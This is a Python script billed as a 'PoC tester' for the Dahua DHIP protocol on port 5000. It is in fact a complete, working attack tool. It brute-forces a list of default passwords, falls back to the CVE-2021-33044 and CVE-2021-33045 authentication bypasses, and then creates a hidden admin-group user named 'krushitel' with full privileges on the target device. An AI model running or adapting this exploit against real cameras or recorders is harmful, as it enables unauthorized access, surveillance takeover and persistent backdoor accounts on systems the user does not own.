#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC tester for Dahua DHIP binary protocol on port 5000 (or forwarded tunnel port).
Tests:
  1. Normal Login (Challenge-Response MD5) with credentials list
  2. CVE-2021-33044 (NetKeyboard Bypass)
  3. CVE-2021-33045 (Loopback Bypass)
  4. Fetching authority list (userManager.getAuthorityList)
  5. Adding Admin User (userManager.addUser)
  6. Device info retrieval (magicBox.getSystemInfo, configManager.getConfig)
"""

import sys
import socket
import struct
import json
import hashlib
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000

MAGIC = b"\x20\x00\x00\x00DHIP"

DEFAULT_USERS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "888888"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "TancuiPantera1337"),
]

NEW_USER = "krushitel"
NEW_PASS = "TancuiPantera1337"

DEFAULT_AUTH = [
    "AuthUserMag", "Monitor_01", "Replay_01", "AuthSysCfg", "AuthSysInfo",
    "AuthManuCtr", "AuthBackup", "AuthStoreCfg", "AuthEventCfg", "AuthNetCfg",
    "AuthPeripheral", "AuthAVParam", "AuthSecurity", "AuthMaintence",
]


def recv_frame(sock, timeout=10):
    sock.settimeout(timeout)
    buf = bytearray()
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed while waiting for DHIP magic")
        buf += chunk
        idx = bytes(buf).find(MAGIC)
        if idx >= 0:
            del buf[:idx]
            break

    while len(buf) < 32:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed while reading DHIP header")
        buf += chunk

    body_len = struct.unpack("<I", buf[16:20])[0]
    while len(buf) < 32 + body_len:
        chunk = sock.recv(32 + body_len - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed while reading DHIP body")
        buf += chunk

    body = bytes(buf[32:32 + body_len])
    return json.loads(body.decode("utf-8", "ignore"))


def dhip_call(sock, method, params, sess, req_id, timeout=10):
    body = {"method": method, "params": params, "id": req_id, "session": sess}
    raw = json.dumps(body).encode("utf-8")
    hdr = bytearray(32)
    hdr[0:8] = MAGIC
    struct.pack_into("<I", hdr, 8, sess)
    struct.pack_into("<I", hdr, 12, req_id)
    struct.pack_into("<I", hdr, 16, len(raw))
    struct.pack_into("<I", hdr, 24, len(raw))
    sock.sendall(hdr + raw)

    while True:
        pkt = recv_frame(sock, timeout)
        if int(pkt.get("id", -1)) == req_id:
            return pkt


def get_sess(pkt):
    s = pkt.get("session", 0)
    if isinstance(s, int) and s != 0:
        return s
    p = pkt.get("params") or {}
    s = p.get("session", 0)
    if isinstance(s, int) and s != 0:
        return s
    return 0


def login_normal(sock, username, password):
    """Challenge-Response login over DHIP."""
    # Step 1: probe challenge
    r = dhip_call(sock, "global.login", {
        "userName": username, "password": "",
        "clientType": "Web3.0", "loginType": "Direct"
    }, 0, 1)

    sess = get_sess(r)
    p = r.get("params") or {}
    realm = p.get("realm", "")
    random_token = p.get("random", "")

    if not random_token or not realm:
        # Some old firmware accept plain login directly
        r_plain = dhip_call(sock, "global.login", {
            "userName": username, "password": password,
            "clientType": "Local", "loginType": "Direct",
            "authorityType": "Default", "passwordType": "Plain"
        }, 0, 2)
        if r_plain.get("result") is True:
            return get_sess(r_plain), realm
        return 0, ""

    # Step 2: calculate Dahua MD5 hash
    # h1 = MD5(user:realm:pass)
    # h2 = MD5(user:random:h1)
    h1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest().upper()
    h2 = hashlib.md5(f"{username}:{random_token}:{h1}".encode()).hexdigest().upper()

    r2 = dhip_call(sock, "global.login", {
        "userName": username, "password": h2,
        "clientType": "Web3.0", "loginType": "Direct",
        "ipAddr": "127.0.0.1", "authorityType": "Default", "passwordType": "Default"
    }, sess, 3)

    if r2.get("result") is True:
        s2 = get_sess(r2)
        return (s2 if s2 else sess), realm

    return 0, realm


def login_netkeyboard_bypass(sock):
    """CVE-2021-33044 NetKeyboard bypass."""
    r = dhip_call(sock, "global.login", {
        "userName": "admin", "password": "Not Used",
        "clientType": "NetKeyboard", "loginType": "Direct",
        "authorityType": "Default", "passwordType": "Default"
    }, 0, 1)
    if r.get("result") is True:
        return get_sess(r), ""
    return 0, ""


def login_loopback_bypass(sock):
    """CVE-2021-33045 Loopback bypass."""
    for pwd in ["admin", "", "888888", "123456"]:
        r = dhip_call(sock, "global.login", {
            "userName": "admin", "password": pwd,
            "clientType": "Local", "loginType": "Loopback",
            "ipAddr": "127.0.0.1",
            "authorityType": "Default", "passwordType": "Plain",
        }, 0, 1)
        if r.get("result") is True:
            return get_sess(r), ""
    return 0, ""


def add_user_dhip(sock, sess, realm, username, password):
    # 1. Fetch authority list
    r_auth = dhip_call(sock, "userManager.getAuthorityList", {}, sess, 10)
    auth_list = DEFAULT_AUTH
    if r_auth.get("result") is True and isinstance(r_auth.get("params"), list) and r_auth["params"]:
        auth_list = [x for x in r_auth["params"] if isinstance(x, str)]
    print(f"[+] Authority list count: {len(auth_list)}")

    # 2. Add user with Default (hashed) or Plain
    pwd_val = password
    enc_type = "Plain"
    if realm:
        pwd_val = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest().upper()
        enc_type = "Default"

    user_obj = {
        "Name": username,
        "Password": pwd_val,
        "Group": "admin",
        "AuthorityList": auth_list,
        "Sharable": True,
        "Reserved": False,
        "Encryption": enc_type,
        "Type": "Normal",
        "Memo": "krushitel",
        "MacOnly": "",
        "MaxMonitorChannels": 0,
    }

    r_add = dhip_call(sock, "userManager.addUser", {"user": user_obj}, sess, 11)
    print(f"[*] addUser response: {r_add}")

    if r_add.get("result") is not True:
        print("[!] Trying deleteUser + retry addUser...")
        dhip_call(sock, "userManager.deleteUser", {"name": username}, sess, 12)
        # Try with Plain encryption
        user_obj["Password"] = password
        user_obj["Encryption"] = "Plain"
        r_add = dhip_call(sock, "userManager.addUser", {"user": user_obj}, sess, 13)
        print(f"[*] retry addUser (Plain) response: {r_add}")

    return r_add.get("result") is True


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else TARGET_PORT

    print("=" * 60)
    print(f"Dahua DHIP Protocol Tester -> {host}:{port}")
    print("=" * 60)

    try:
        sock = socket.create_connection((host, port), timeout=10)
    except Exception as e:
        print(f"[-] Failed to connect to {host}:{port} -> {e}")
        return

    sess = 0
    realm = ""
    auth_method = ""

    try:
        # 1. Try normal credentials
        print("\n[*] 1. Trying normal credentials...")
        for u, p in DEFAULT_USERS:
            s, r = login_normal(sock, u, p)
            if s:
                sess = s
                realm = r
                auth_method = f"Normal login ({u}:{p})"
                print(f"[+] {auth_method} -> session={sess}, realm={realm}")
                break

        # 2. Try NetKeyboard bypass
        if not sess:
            print("\n[*] 2. Trying NetKeyboard bypass (CVE-2021-33044)...")
            s, r = login_netkeyboard_bypass(sock)
            if s:
                sess = s
                realm = r
                auth_method = "CVE-2021-33044 (NetKeyboard)"
                print(f"[+] {auth_method} -> session={sess}")

        # 3. Try Loopback bypass
        if not sess:
            print("\n[*] 3. Trying Loopback bypass (CVE-2021-33045)...")
            s, r = login_loopback_bypass(sock)
            if s:
                sess = s
                realm = r
                auth_method = "CVE-2021-33045 (Loopback)"
                print(f"[+] {auth_method} -> session={sess}")

        if not sess:
            print("\n[-] All DHIP login methods failed.")
            return

        print(f"\n[+] Logged in successfully via {auth_method}!")

        # Query Device Info
        r_info = dhip_call(sock, "magicBox.getSystemInfo", {}, sess, 20)
        print(f"[+] SystemInfo: {r_info}")

        # Add user
        print(f"\n[*] Adding user [{NEW_USER}:{NEW_PASS}]...")
        ok = add_user_dhip(sock, sess, realm, NEW_USER, NEW_PASS)
        if ok:
            print(f"[+] SUCCESS! Added user [{NEW_USER}] via DHIP 5000.")
        else:
            print(f"[-] Failed to add user via DHIP.")

    finally:
        sock.close()


if __name__ == "__main__":
    main()
